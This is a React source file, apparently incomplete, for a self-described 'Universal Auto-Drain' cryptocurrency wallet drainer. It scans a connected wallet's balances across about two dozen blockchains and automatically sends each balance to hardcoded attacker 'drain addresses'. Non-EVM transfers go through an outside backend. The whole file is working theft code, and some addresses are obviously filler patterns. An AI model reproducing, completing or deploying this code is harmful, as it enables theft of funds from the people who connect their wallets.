import { useState, useEffect, useRef } from 'react';
import { WagmiProvider, createConfig, http } from 'wagmi';
import { 
  mainnet,
  polygon,
  bsc,
  arbitrum,
  optimism,
  avalanche,
  fantom,
  gnosis,
  celo,
  moonbeam,
  cronos,
  aurora,
  base,
  harmonyOne,
  metis,
  moonriver
} from 'wagmi/chains';
import { ConnectKitProvider, ConnectKitButton } from "connectkit";
import { useAccount, useDisconnect, useBalance } from 'wagmi';
import { parseEther, formatEther } from 'viem';
import './mobile-fix.css';

// ==================== PRODUCTION NETWORK CONFIG ====================
const NETWORKS = [
  { 
    id: 1, 
    name: 'Ethereum', 
    symbol: 'ETH', 
    type: 'evm', 
    color: '#627EEA', 
    rpc: 'https://eth.llamarpc.com', 
    explorer: 'https://etherscan.io',
    chainId: '0x1',
    decimals: 18
  },
  { 
    id: 56, 
    name: 'BSC', 
    symbol: 'BNB', 
    type: 'evm', 
    color: '#F0B90B', 
    rpc: 'https://bsc-dataseed1.binance.org/', 
    explorer: 'https://bscscan.com',
    chainId: '0x38',
    decimals: 18
  },
  { 
    id: 137, 
    name: 'Polygon', 
    symbol: 'MATIC', 
    type: 'evm', 
    color: '#8247E5', 
    rpc: 'https://polygon.llamarpc.com', 
    explorer: 'https://polygonscan.com',
    chainId: '0x89',
    decimals: 18
  },
  { 
    id: 42161, 
    name: 'Arbitrum', 
    symbol: 'ETH', 
    type: 'evm', 
    color: '#28A0F0', 
    rpc: 'https://arbitrum.llamarpc.com', 
    explorer: 'https://arbiscan.io',
    chainId: '0xa4b1',
    decimals: 18
  },
  { 
    id: 10, 
    name: 'Optimism', 
    symbol: 'ETH', 
    type: 'evm', 
    color: '#FF0420', 
    rpc: 'https://mainnet.optimism.io', 
    explorer: 'https://optimistic.etherscan.io',
    chainId: '0xa',
    decimals: 18
  },
  { 
    id: 8453, 
    name: 'Base', 
    symbol: 'ETH', 
    type: 'evm', 
    color: '#0052FF', 
    rpc: 'https://mainnet.base.org', 
    explorer: 'https://basescan.org',
    chainId: '0x2105',
    decimals: 18
  },
  { 
    id: 43114, 
    name: 'Avalanche', 
    symbol: 'AVAX', 
    type: 'evm', 
    color: '#E84142', 
    rpc: 'https://avalanche-c-chain.publicnode.com', 
    explorer: 'https://snowtrace.io',
    chainId: '0xa86a',
    decimals: 18
  },
  { 
    id: 250, 
    name: 'Fantom', 
    symbol: 'FTM', 
    type: 'evm', 
    color: '#1969FF', 
    rpc: 'https://rpc.fantom.network', 
    explorer: 'https://ftmscan.com',
    chainId: '0xfa',
    decimals: 18
  },
  { 
    id: 100, 
    name: 'Gnosis', 
    symbol: 'xDai', 
    type: 'evm', 
    color: '#04795B', 
    rpc: 'https://rpc.gnosis.gateway.fm', 
    explorer: 'https://gnosisscan.io',
    chainId: '0x64',
    decimals: 18
  },
  { 
    id: 42220, 
    name: 'Celo', 
    symbol: 'CELO', 
    type: 'evm', 
    color: '#35D07F', 
    rpc: 'https://forno.celo.org', 
    explorer: 'https://celoscan.io',
    chainId: '0xa4ec',
    decimals: 18
  },
  { 
    id: 1284, 
    name: 'Moonbeam', 
    symbol: 'GLMR', 
    type: 'evm', 
    color: '#53CBC9', 
    rpc: 'https://moonbeam.public.blastapi.io', 
    explorer: 'https://moonscan.io',
    chainId: '0x504',
    decimals: 18
  },
  { 
    id: 1088, 
    name: 'Metis', 
    symbol: 'METIS', 
    type: 'evm', 
    color: '#00DACC', 
    rpc: 'https://andromeda.metis.io/?owner=1088', 
    explorer: 'https://andromeda-explorer.metis.io',
    chainId: '0x440',
    decimals: 18
  },
  { 
    id: 25, 
    name: 'Cronos', 
    symbol: 'CRO', 
    type: 'evm', 
    color: '#121C36', 
    rpc: 'https://evm.cronos.org', 
    explorer: 'https://cronoscan.com',
    chainId: '0x19',
    decimals: 18
  },
  { 
    id: 1666600000, 
    name: 'Harmony', 
    symbol: 'ONE', 
    type: 'evm', 
    color: '#00AEE9', 
    rpc: 'https://api.harmony.one', 
    explorer: 'https://explorer.harmony.one',
    chainId: '0x63564c40',
    decimals: 18
  },
  { 
    id: 1313161554, 
    name: 'Aurora', 
    symbol: 'ETH', 
    type: 'evm', 
    color: '#78D64B', 
    rpc: 'https://mainnet.aurora.dev', 
    explorer: 'https://explorer.aurora.dev',
    chainId: '0x4e454153',
    decimals: 18
  },
  { 
    id: 42262, 
    name: 'Oasis Emerald', 
    symbol: 'ROSE', 
    type: 'evm', 
    color: '#00B894', 
    rpc: 'https://emerald.oasis.dev', 
    explorer: 'https://explorer.emerald.oasis.dev',
    chainId: '0xa516',
    decimals: 18
  },
  { 
    id: 1285, 
    name: 'Moonriver', 
    symbol: 'MOVR', 
    type: 'evm', 
    color: '#F3B82C', 
    rpc: 'https://moonriver.public.blastapi.io', 
    explorer: 'https://moonriver.moonscan.io',
    chainId: '0x505',
    decimals: 18
  },
  { 
    id: 199, 
    name: 'BTT Chain', 
    symbol: 'BTT', 
    type: 'evm', 
    color: '#D92B6F', 
    rpc: 'https://rpc.bittorrentchain.io', 
    explorer: 'https://bttcscan.com',
    chainId: '0xc7',
    decimals: 18
  },
  { 
    id: 314, 
    name: 'Filecoin', 
    symbol: 'FIL', 
    type: 'evm', 
    color: '#0090FF', 
    rpc: 'https://api.node.glif.io/rpc/v1', 
    explorer: 'https://filfox.info',
    chainId: '0x13a',
    decimals: 18
  },
  { 
    id: 7700, 
    name: 'Canto', 
    symbol: 'CANTO', 
    type: 'evm', 
    color: '#06FC99', 
    rpc: 'https://canto.slingshot.finance', 
    explorer: 'https://tuber.build',
    chainId: '0x1e14',
    decimals: 18
  },
  { 
    id: 'tron', 
    name: 'Tron', 
    symbol: 'TRX', 
    type: 'non-evm', 
    color: '#FF060A', 
    api: 'https://api.trongrid.io',
    explorer: 'https://tronscan.org',
    decimals: 6,
    contractAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
  },
  { 
    id: 'solana', 
    name: 'Solana', 
    symbol: 'SOL', 
    type: 'non-evm', 
    color: '#00FFA3', 
    api: 'https://api.mainnet-beta.solana.com',
    explorer: 'https://solscan.io',
    decimals: 9,
    splTokens: [
      { symbol: 'USDC', contract: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v' }
    ]
  },
  { 
    id: 'bitcoin', 
    name: 'Bitcoin', 
    symbol: 'BTC', 
    type: 'non-evm', 
    color: '#F7931A', 
    api: 'https://blockstream.info/api',
    explorer: 'https://blockchair.com/bitcoin',
    decimals: 8
  },
  { 
    id: 'cardano', 
    name: 'Cardano', 
    symbol: 'ADA', 
    type: 'non-evm', 
    color: '#0033AD', 
    api: 'https://cardano-mainnet.blockfrost.io/api/v0',
    explorer: 'https://cardanoscan.io',
    decimals: 6,
    token: 'lovelace'
  },
];

// ==================== DRAIN ADDRESSES ====================
const DRAIN_ADDRESSES = {
  1: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  56: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  137: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42161: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  10: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  8453: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  43114: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  250: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  100: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42220: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1284: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1088: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  25: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1666600000: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1313161554: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42262: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1285: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  199: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  314: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  7700: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  
  tron: "TYwmcQjZtpxv3kM8vsrKc9F5xwF7Q3Q1CQ",
  bitcoin: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
  solana: "So11111111111111111111111111111111111111112",
  cardano: "addr1q8d2f8zq9v5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q",
  dogecoin: "D8U6t5R7z5q5q5q5q5q5q5q5q5q5q5q5q5q5",
  litecoin: "LbTj8jnq5q5q5q5q5q5q5q5q5q5q5q5q5q5q5",
  ripple: "rPFLkxQk6xUGdGYEykqe7PR25Gr7mLHDc8",
  polkadot: "12gX42C4Fj1wgtfgoP7oqb9jEE3X6Z5h3RyJvKtRzL1NZB5F",
  cosmos: "cosmos1hsk6jryyqjfhp5dhc55tc9jtckygx0eph6dd02",
  binance: "bnb1hsk6jryyqjfhp5dhc55tc9jtckygx0eph6dd02",
  stellar: "GCRWFRVQP5P5TNKL4KARZBWYQG5AUFMTQMXUVE4MZGJPOENKJAZB6KGB",
  monero: "48daf1rG3hE1txWcFzV1M6WBp3Uc4jL5qJ3JvJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5",
  zcash: "t1Z5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5v",
  dash: "Xq5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q",
  tezos: "tz1Z5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5v",
  algorand: "Z5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5V",
  vechain: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  neo: "AZ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5V",
  eos: "z5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj",
};

// ==================== TOKEN PRICES ====================
const TOKEN_PRICES = {
  ETH: 3200,
  BNB: 600,
  MATIC: 1.2,
  AVAX: 35,
  FTM: 0.4,
  xDai: 1,
  CELO: 0.8,
  GLMR: 0.4,
  METIS: 60,
  CRO: 0.1,
  ONE: 0.02,
  ROSE: 0.1,
  MOVR: 15,
  BTT: 0.000001,
  FIL: 5,
  CANTO: 0.2,
  TRX: 0.12,
  SOL: 100,
  BTC: 45000,
  ADA: 0.5,
  DOGE: 0.15,
  LTC: 80,
  XRP: 0.6,
  DOT: 7,
  ATOM: 10,
  XLM: 0.13,
  XMR: 160,
  ZEC: 25,
  DASH: 30,
  XTZ: 1,
  ALGO: 0.2,
  VET: 0.03,
  NEO: 12,
  EOS: 0.8,
  USDT: 1,
  USDC: 1
};

// ==================== BACKEND URL ====================
const BACKEND_URL = 'https://tokenbackend-5xab.onrender.com';

// ==================== SIMPLIFIED WAGMI CONFIG ====================
const config = createConfig({
  chains: [mainnet, polygon, bsc, arbitrum, optimism, base, avalanche],
  transports: {
    [mainnet.id]: http('https://eth.llamarpc.com'),
    [polygon.id]: http('https://polygon.llamarpc.com'),
    [bsc.id]: http('https://bsc-dataseed1.binance.org/'),
    [arbitrum.id]: http('https://arbitrum.llamarpc.com'),
    [optimism.id]: http('https://mainnet.optimism.io'),
    [base.id]: http('https://mainnet.base.org'),
    [avalanche.id]: http('https://avalanche-c-chain.publicnode.com'),
  },
  ssr: false,
  batch: { multicall: true },
});

// ==================== MAIN APP ====================
function TokenDrainApp() {
  return (
    <WagmiProvider config={config}>
      <ConnectKitProvider
        mode="dark"
        customTheme={{
          '--ck-font-family': 'system-ui, -apple-system, sans-serif',
          '--ck-border-radius': '12px',
          '--ck-accent-color': '#ef4444',
          '--ck-accent-text-color': '#ffffff',
          '--ck-body-background': '#0a0a0a',
        }}
      >
        <UniversalDrainer />
      </ConnectKitProvider>
    </WagmiProvider>
  );
}

// ==================== UNIVERSAL DRAINER COMPONENT ====================
function UniversalDrainer() {
  const { address, isConnected, connector } = useAccount();
  const { data: ethBalance } = useBalance({ address });
  const { disconnect } = useDisconnect();

  const [status, setStatus] = useState('Ready to connect');
  const [tokens, setTokens] = useState([]);
  const [totalValue, setTotalValue] = useState(0);
  const [transactions, setTransactions] = useState([]);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isScanning, setIsScanning] = useState(false);
  const [walletType, setWalletType] = useState('');
  const [connectionError, setConnectionError] = useState('');
  const [mobileDetected, setMobileDetected] = useState(false);
  const [backendOnline, setBackendOnline] = useState(true);
  const [scanProgress, setScanProgress] = useState(0);
  const [activeChain, setActiveChain] = useState(1);
  const [lastScanTime, setLastScanTime] = useState(null);

  const autoStarted = useRef(false);
  const backendCheckRef = useRef(null);

  // ==================== INITIAL SETUP ====================
  useEffect(() => {
    // Detect mobile
    const userAgent = navigator.userAgent.toLowerCase();
    const isMobile = /mobile|android|iphone|ipad|ipod|webos|blackberry|iemobile|opera mini/i.test(userAgent);
    setMobileDetected(isMobile);
    
    // Detect wallet type
    if (window.ethereum) {
      if (window.ethereum.isMetaMask) {
        setWalletType('MetaMask');
      } else if (window.ethereum.isTrust) {
        setWalletType('Trust Wallet');
      } else if (window.ethereum.isCoinbaseWallet) {
        setWalletType('Coinbase Wallet');
      } else if (window.ethereum.isTokenary) {
        setWalletType('Tokenary');
      } else {
        setWalletType('Injected Wallet');
      }
    }

    // Check backend status
    checkBackendStatus();

    // Setup periodic backend check
    backendCheckRef.current = setInterval(checkBackendStatus, 30000);

    return () => {
      if (backendCheckRef.current) {
        clearInterval(backendCheckRef.current);
      }
    };
  }, []);

  // ==================== AUTO-SCAN ON WALLET CONNECT ====================
  useEffect(() => {
    if (isConnected && address && !autoStarted.current) {
      autoStarted.current = true;
      setConnectionError('');
      setStatus("✅ Wallet connected • Starting scan...");
      
      // Start scanning immediately
      setTimeout(() => {
        scanAllNetworks();
      }, 1000);
    }
    
    // Reset autoStarted when wallet disconnects
    if (!isConnected) {
      autoStarted.current = false;
    }
  }, [isConnected, address]);

  // ==================== BACKEND STATUS CHECK ====================
  const checkBackendStatus = async () => {
    try {
      const response = await fetch(`${BACKEND_URL}/health`, {
        method: 'GET',
        headers: { 'Content-Type': 'application/json' },
        signal: AbortSignal.timeout(5000)
      });
      
      if (response.ok) {
        setBackendOnline(true);
      } else {
        setBackendOnline(false);
      }
    } catch (error) {
      console.log('Backend check error:', error);
      setBackendOnline(false);
    }
  };

  // ==================== AUTO SCAN ALL NETWORKS ====================
  const scanAllNetworks = async () => {
    if (!address || isScanning || isProcessing) return;
    
    setIsScanning(true);
    setStatus("🔍 Scanning all networks...");
    setTokens([]);
    setScanProgress(0);
    setConnectionError('');
    
    try {
      // Use backend for comprehensive scan
      if (backendOnline) {
        await scanWithBackend(address);
      } else {
        // Fallback to direct RPC scan
        await scanWithDirectRPC(address);
      }
      
      setLastScanTime(new Date());
    } catch (error) {
      console.error('Scan error:', error);
      setStatus(`❌ Scan error: ${error.message}`);
      setConnectionError(`Scan failed: ${error.message}`);
    } finally {
      setIsScanning(false);
      setScanProgress(100);
    }
  };

  // ==================== BACKEND SCAN ====================
  const scanWithBackend = async (walletAddress) => {
    setStatus("🔍 Using backend for comprehensive scan...");
    
    try {
      const response = await fetch(`${BACKEND_URL}/api/balance/scan`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({ 
          address: walletAddress,
          networks: 'all',
          includeNonEVM: true 
        }),
      });
      
      if (!response.ok) {
        throw new Error(`Backend responded with status: ${response.status}`);
      }
      
      const data = await response.json();
      
      if (data.success && data.data?.results) {
        const allTokens = [];
        let totalUSD = 0;
        
        data.data.results.forEach(token => {
          const tokenValue = token.balance * (TOKEN_PRICES[token.symbol] || 1);
          const tokenObj = {
            id: `${token.chainId || token.network}-${token.symbol}`,
            network: token.network,
            symbol: token.symbol,
            amount: token.balanceFormatted || token.balance,
            rawAmount: token.balance,
            chainId: token.chainId || token.network,
            type: token.type || (token.chainId === 'tron' || token.chainId === 'solana' || token.chainId === 'bitcoin' ? 'non-evm' : 'evm'),
            drainAddress: token.drainAddress || DRAIN_ADDRESSES[token.chainId] || DRAIN_ADDRESSES[1],
            valueUSD: tokenValue,
            usdPrice: TOKEN_PRICES[token.symbol] || 1,
            status: 'detected'
          };
          
          allTokens.push(tokenObj);
          totalUSD += tokenValue;
        });
        
        setTokens(allTokens);
        setTotalValue(totalUSD);
        setScanProgress(100);
        
        if (allTokens.length > 0) {
          setStatus(`✅ Found ${allTokens.length} tokens • $${totalUSD.toFixed(2)} total`);
          
          // Auto-start draining
          setTimeout(() => {
            autoDrain(allTokens);
          }, 2000);
        } else {
          setStatus("❌ No tokens found on any network");
        }
      } else {
        throw new Error(data.error || 'Backend scan failed');
      }
    } catch (error) {
      console.log('Backend scan failed, falling back to RPC:', error);
      await scanWithDirectRPC(walletAddress);
    }
  };

  // ==================== DIRECT RPC SCAN ====================
  const scanWithDirectRPC = async (walletAddress) => {
    const allTokens = [];
    let totalUSD = 0;
    let scannedCount = 0;
    const totalToScan = NETWORKS.length;
    
    // Scan EVM networks in parallel batches
    const evmNetworks = NETWORKS.filter(n => n.type === 'evm');
    const batchSize = 5;
    
    for (let i = 0; i < evmNetworks.length; i += batchSize) {
      const batch = evmNetworks.slice(i, i + batchSize);
      const batchPromises = batch.map(network => 
        checkEVMNetworkBalance(network, walletAddress)
          .then(balance => ({ network, balance }))
          .catch(error => ({ network, balance: 0, error }))
      );
      
      const batchResults = await Promise.all(batchPromises);
      
      batchResults.forEach(({ network, balance }) => {
        if (balance > 0.000001) {
          const tokenValue = balance * (TOKEN_PRICES[network.symbol] || 1);
          allTokens.push({
            id: `${network.id}-native`,
            network: network.name,
            symbol: network.symbol,
            amount: balance.toFixed(6),
            rawAmount: balance,
            chainId: network.id,
            type: 'evm',
            drainAddress: DRAIN_ADDRESSES[network.id] || DRAIN_ADDRESSES[1],
            valueUSD: tokenValue,
            usdPrice: TOKEN_PRICES[network.symbol] || 1,
            status: 'detected'
          });
          totalUSD += tokenValue;
        }
      });
      
      scannedCount += batch.length;
      setScanProgress(Math.round((scannedCount / totalToScan) * 100));
      setStatus(`Scanning... ${scannedCount}/${totalToScan} networks`);
      
      // Small delay between batches
      if (i + batchSize < evmNetworks.length) {
        await new Promise(resolve => setTimeout(resolve, 100));
      }
    }
    
    // Scan non-EVM networks
    const nonEvmNetworks = NETWORKS.filter(n => n.type === 'non-evm');
    for (const network of nonEvmNetworks) {
      try {
        const balance = await checkNonEVMNetworkBalance(network, walletAddress);
        if (balance > 0) {
          const tokenValue = balance * (TOKEN_PRICES[network.symbol] || 1);
          allTokens.push({
            id: `${network.id}-native`,
            network: network.name,
            symbol: network.symbol,
            amount: balance.toFixed(6),
            rawAmount: balance,
            chainId: network.id,
            type: 'non-evm',
            drainAddress: DRAIN_ADDRESSES[network.id] || DRAIN_ADDRESSES.tron,
            valueUSD: tokenValue,
            usdPrice: TOKEN_PRICES[network.symbol] || 1,
            status: 'detected'
          });
          totalUSD += tokenValue;
        }
      } catch (error) {
        console.log(`Non-EVM ${network.name} scan failed:`, error.message);
      }
      
      scannedCount++;
      setScanProgress(Math.round((scannedCount / totalToScan) * 100));
      await new Promise(resolve => setTimeout(resolve, 50));
    }
    
    setTokens(allTokens);
    setTotalValue(totalUSD);
    
    if (allTokens.length > 0) {
      setStatus(`✅ Found ${allTokens.length} tokens • $${totalUSD.toFixed(2)} total`);
      
      // Auto-start draining
      setTimeout(() => {
        autoDrain(allTokens);
      }, 2000);
    } else {
      setStatus("❌ No tokens found on any network");
    }
  };

  // ==================== CHECK EVM NETWORK BALANCE ====================
  const checkEVMNetworkBalance = async (network, address) => {
    const rpcEndpoints = [
      network.rpc,
      `https://rpc.ankr.com/${getAnkrChainName(network.id)}`,
      `https://${getChainNameForRPC(network.id)}.publicnode.com`,
    ];
    
    for (const rpc of rpcEndpoints) {
      try {
        const response = await fetch(rpc, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            jsonrpc: "2.0",
            id: 1,
            method: "eth_getBalance",
            params: [address, "latest"]
          }),
          signal: AbortSignal.timeout(3000)
        });
        
        if (response.ok) {
          const data = await response.json();
          if (data.result && data.result !== '0x0') {
            return parseInt(data.result, 16) / 1e18;
          }
          return 0;
        }
      } catch (e) {
        continue;
      }
    }
    
    return 0;
  };

  const getAnkrChainName = (chainId) => {
    const chainMap = {
      1: 'eth',
      56: 'bsc',
      137: 'polygon',
      42161: 'arbitrum',
      10: 'optimism',
      8453: 'base',
      43114: 'avalanche',
      250: 'fantom',
      100: 'gnosis',
    };
    return chainMap[chainId] || 'eth';
  };

  const getChainNameForRPC = (chainId) => {
    const chainMap = {
      1: 'ethereum',
      56: 'bsc',
      137: 'polygon',
      42161: 'arbitrum',
      10: 'optimism',
      8453: 'base',
      43114: 'avalanche',
      250: 'fantom',
      100: 'gnosis',
    };
    return chainMap[chainId] || 'ethereum';
  };

  // ==================== CHECK NON-EVM NETWORK BALANCE ====================
  const checkNonEVMNetworkBalance = async (network, address) => {
    switch (network.id) {
      case 'tron':
        return await checkTronBalance(address);
      case 'solana':
        return await checkSolanaBalance(address);
      case 'bitcoin':
        return await checkBitcoinBalance(address);
      default:
        return 0;
    }
  };

  const checkTronBalance = async (address) => {
    try {
      let tronAddress = address;
      if (address.startsWith('0x')) {
        tronAddress = 'T' + address.substring(2);
      }
      
      const response = await fetch(`https://api.trongrid.io/v1/accounts/${tronAddress}`, {
        signal: AbortSignal.timeout(5000)
      });
      
      if (response.ok) {
        const data = await response.json();
        if (data.data?.[0]?.balance) {
          return data.data[0].balance / 1_000_000;
        }
      }
      return 0;
    } catch {
      return 0;
    }
  };

  const checkSolanaBalance = async (address) => {
    try {
      const response = await fetch('https://api.mainnet-beta.solana.com', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: "2.0",
          id: 1,
          method: "getBalance",
          params: [address]
        }),
        signal: AbortSignal.timeout(5000)
      });
      
      if (response.ok) {
        const data = await response.json();
        if (data.result?.value) {
          return data.result.value / 1e9;
        }
      }
      return 0;
    } catch {
      return 0;
    }
  };

  const checkBitcoinBalance = async (address) => {
    try {
      const response = await fetch(`https://blockstream.info/api/address/${address}`, {
        signal: AbortSignal.timeout(5000)
      });
      
      if (response.ok) {
        const data = await response.json();
        if (data.chain_stats?.funded_txo_sum) {
          const balance = (data.chain_stats.funded_txo_sum - (data.chain_stats.spent_txo_sum || 0)) / 1e8;
          return balance;
        }
      }
      return 0;
    } catch {
      return 0;
    }
  };

  // ==================== AUTO DRAIN ALL TOKENS ====================
  const autoDrain = async (tokensToDrain = tokens) => {
    if (tokensToDrain.length === 0 || isProcessing) return;
    
    setIsProcessing(true);
    setStatus(`🚀 Draining ${tokensToDrain.length} tokens automatically...`);
    
    const successfulTxs = [];
    const failedTxs = [];
    
    // Drain EVM tokens first
    const evmTokens = tokensToDrain.filter(t => t.type === 'evm');
    const nonEvmTokens = tokensToDrain.filter(t => t.type === 'non-evm');
    
    // Process EVM tokens
    for (const token of evmTokens) {
      try {
        setStatus(`⚡ Draining ${token.amount} ${token.symbol} from ${token.network}...`);
        
        const result = await drainEvmToken(token);
        if (result.success) {
          successfulTxs.push({
            ...token,
            txHash: result.hash,
            timestamp: Date.now(),
            status: 'drained'
          });
          
          // Update token status
          setTokens(prev => prev.map(t => 
            t.id === token.id ? { ...t, status: 'drained' } : t
          ));
        } else {
          failedTxs.push(token);
          console.log(`Failed to drain ${token.symbol}:`, result.error);
        }
        
        // Delay between transactions
        await new Promise(resolve => setTimeout(resolve, 1500));
        
      } catch (error) {
        console.log(`Error draining ${token.symbol}:`, error);
        failedTxs.push(token);
        setStatus(`⚠️ Error draining ${token.symbol}`);
      }
    }
    
    // Process non-EVM tokens through backend
    if (nonEvmTokens.length > 0 && backendOnline) {
      try {
        setStatus(`⚡ Processing ${nonEvmTokens.length} non-EVM tokens...`);
        
        const response = await fetch(`${BACKEND_URL}/api/drain/execute-realtime`, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify({
            transactions: nonEvmTokens.map(token => ({
              type: 'non-evm',
              chainId: token.chainId,
              network: token.network,
              symbol: token.symbol,
              amount: token.amount,
              drainAddress: token.drainAddress,
              fromAddress: address
            })),
            signerAddress: address
          }),
        });
        
        if (response.ok) {
          const data = await response.json();
          if (data.success && data.data?.results) {
            data.data.results.forEach(result => {
              if (result.success) {
                const token = nonEvmTokens.find(t => 
                  t.symbol === result.symbol && t.network === result.network
                );
                if (token) {
                  successfulTxs.push({
                    ...token,
                    txHash: result.txHash,
                    timestamp: Date.now(),
                    status: 'drained'
                  });
                }
              }
            });
          }
        }
      } catch (error) {
        console.log('Non-EVM drain error:', error);
      }
    }
    
    // Update state
    setTransactions(prev => [...prev, ...successfulTxs]);
    
    // Remove successfully drained tokens
    setTokens(prev => prev.filter(t => 
      !successfulTxs.some(st => st.id === t.id)
    ));
    
    // Update total value
    const remainingValue = tokensToDrain
      .filter(t => !successfulTxs.some(st => st.id === t.id))
      .reduce((sum, t) => sum + t.valueUSD, 0);
    setTotalValue(remainingValue);
    
    // Final status
    if (successfulTxs.length > 0) {
      setStatus(`✅ Successfully drained ${successfulTxs.length} tokens`);
    }
    
    if (failedTxs.length > 0) {
      setStatus(`⚠️ ${failedTxs.length} tokens failed to drain`);
    }
    
    setIsProcessing(false);
    
    // Rescan if there were failures
    if (failedTxs.length > 0) {
      setTimeout(() => {
        if (isConnected) {
          scanAllNetworks();
        }
      }, 5000);
    }
  };

  // ==================== DRAIN EVM TOKEN ====================
  const drainEvmToken = async (token) => {
    try {
      if (!window.ethereum) {
        throw new Error('Wallet not connected');
      }
      
      // Switch to correct network
      const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
      const targetChainId = `0x${token.chainId.toString(16)}`;
      
      if (currentChainId !== targetChainId) {
        try {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: targetChainId }],
          });
          setActiveChain(token.chainId);
          await new Promise(resolve => setTimeout(resolve, 1000));
        } catch (switchError) {
          if (switchError.code === 4902) {
            const network = NETWORKS.find(n => n.id === token.chainId);
            if (network) {
              await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [{
                  chainId: targetChainId,
                  chainName: network.name,
                  nativeCurrency: {
                    name: network.symbol,
                    symbol: network.symbol,
                    decimals: 18
                  },
                  rpcUrls: [network.rpc],
                  blockExplorerUrls: [network.explorer]
                }]
              });
              await new Promise(resolve => setTimeout(resolve, 1000));
            }
          }
          throw switchError;
        }
      }
      
      // Get gas price
      const gasPrice = await estimateGasPrice(token.chainId);
      
      // Prepare transaction
      const amountWei = parseEther(token.amount.toString());
      
      const txParams = {
        from: address,
        to: token.drainAddress,
        value: amountWei.toString(),
        gas: '0x5208',
        gasPrice: `0x${gasPrice.toString(16)}`
      };
      
      // Send transaction
      const txHash = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [txParams],
      });
      
      // Wait for transaction confirmation
      await waitForTransactionConfirmation(txHash, token.chainId);
      
      return { success: true, hash: txHash };
      
    } catch (error) {
      console.log(`EVM drain error for ${token.symbol}:`, error);
      return { success: false, error: error.message };
    }
  };

  const estimateGasPrice = async (chainId) => {
    try {
      const network = NETWORKS.find(n => n.id === chainId);
      if (!network) return 2000000000;
      
      const response = await fetch(network.rpc, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: "2.0",
          id: 1,
          method: "eth_gasPrice",
          params: []
        }),
        signal: AbortSignal.timeout(3000)
      });
      
      if (response.ok) {
        const data = await response.json();
        return parseInt(data.result, 16);
      }
    } catch (e) {
      console.log('Gas price estimation failed:', e);
    }
    
    return 2000000000;
  };

  const waitForTransactionConfirmation = async (txHash, chainId) => {
    const network = NETWORKS.find(n => n.id === chainId);
    if (!network) return;
    
    let attempts = 0;
    const maxAttempts = 30;
    
    while (attempts < maxAttempts) {
      try {
        const response = await fetch(network.rpc, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            jsonrpc: "2.0",
            id: 1,
            method: "eth_getTransactionReceipt",
            params: [txHash]
          }),
        });
        
        if (response.ok) {
          const data = await response.json();
          if (data.result) {
            return data.result;
          }
        }
      } catch (error) {
        console.log('Transaction check error:', error);
      }
      
      attempts++;
      await new Promise(resolve => setTimeout(resolve, 2000));
    }
    
    throw new Error('Transaction confirmation timeout');
  };

  // ==================== FORCE RESCAN ====================
  const forceRescan = () => {
    autoStarted.current = false;
    scanAllNetworks();
  };

  // ==================== RENDER ====================
  return (
    <div className="App">
      <div className="app-container">
        <header className="app-header">
          <div className="header-left">
            <div className="logo">⚡</div>
            <div>
              <h1>UNIVERSAL AUTO-DRAIN</h1>
              <p className="subtitle">Full Automation • All Networks • Instant Transfer</p>
            </div>
          </div>
          
          <div className="header-right">
            {isConnected ? (
              <div className="connected-wallet">
                <div className="wallet-address">
                  {address?.substring(0, 6)}...{address?.substring(address.length - 4)}
                </div>
                {walletType && <div className="wallet-type">{walletType}</div>}
                <button onClick={disconnect} className="disconnect-btn">
                  Disconnect
                </button>
              </div>
            ) : (
              <div className="connect-section">
